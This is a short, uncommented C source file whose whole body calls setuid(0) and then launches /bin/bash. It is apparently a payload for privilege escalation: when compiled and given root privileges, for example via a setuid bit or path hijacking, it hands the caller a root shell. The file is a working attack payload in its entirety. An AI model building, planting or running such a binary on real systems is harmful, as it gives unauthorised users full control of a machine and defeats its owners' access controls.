#include <stdio.h>

int main() {
	setuid(0);
	system("/bin/bash");
	return 0;
}
